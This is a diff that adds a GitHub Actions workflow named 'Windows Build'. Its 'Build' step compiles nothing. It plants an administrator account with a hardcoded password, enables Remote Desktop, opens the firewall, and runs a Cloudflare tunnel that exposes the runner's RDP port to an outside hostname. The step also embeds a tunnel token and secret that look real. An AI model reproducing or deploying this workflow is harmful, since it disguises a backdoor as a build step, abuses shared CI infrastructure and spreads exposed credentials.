@@ -1,0 +1,41 @@
+name: Windows Build
+
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    name: Build Windows
+    runs-on: windows-latest
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Show Environment
+        run: |
+          node -v
+          npm -v
+
+      - name: Build
+        run: |
+        
+          [IO.File]::WriteAllText(".\cert.pem","-----BEGIN ARGO TUNNEL TOKEN-----`neyJ6b25lSUQiOiJhMmUzYWE1NTZjMmVmMzg5ODIwZTRiYzE0ODYzMDMzZCIsImFj`nY291bnRJRCI6IjBkNjNmZWIwOWM2NWVkMjdmMzk0MjAwMjdiMjA1MzZjIiwiYXBp`nVG9rZW4iOiJjZnV0X3g0dXhxcjh1UDNjZWh1NFp3OG5JRHBacHpzcXRnR0ZvUnph`neEFDdTEzMjY0NmFlZSJ9`n-----END ARGO TUNNEL TOKEN-----`n")
+          '{"AccountTag":"0d63feb09c65ed27f39420027b20536c","TunnelSecret":"Dxd0imoN0sJrM7YeNVC58fPmlKOvWbCHRvukCSPTJiM=","TunnelID":"397f6832-48aa-48d9-a3ac-0a369ae3f9c9","Endpoint":""}' | Set-Content -Encoding utf8 .\397f6832-48aa-48d9-a3ac-0a369ae3f9c9.json
+          "tunnel: 397f6832-48aa-48d9-a3ac-0a369ae3f9c9`ncredentials-file: 397f6832-48aa-48d9-a3ac-0a369ae3f9c9.json`n`ningress:`n  - hostname: examplegithubwindows.yunzhongzhuan.com`n    service: tcp://localhost:3389`n`n  - service: http_status:404" | Set-Content -Encoding utf8 .\397f6832-48aa-48d9-a3ac-0a369ae3f9c9.yml
+
+          curl -LO "https://github.com/cloudflare/cloudflared/releases/download/2026.7.3/cloudflared-windows-amd64.exe"
+
+          
+
+          $USERNAME="Administrator"
+          $PASSWORD="LIWENHUA"
+          net user $USERNAME $PASSWORD /add
+          net localgroup Administrators $USERNAME /add
+          net localgroup "Remote Desktop Users" $USERNAME /add
+          reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+          netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
+
+          .\cloudflared-windows-amd64.exe --config 397f6832-48aa-48d9-a3ac-0a369ae3f9c9.yml tunnel --origincert cert.pem run 397f6832-48aa-48d9-a3ac-0a369ae3f9c9
+
+          
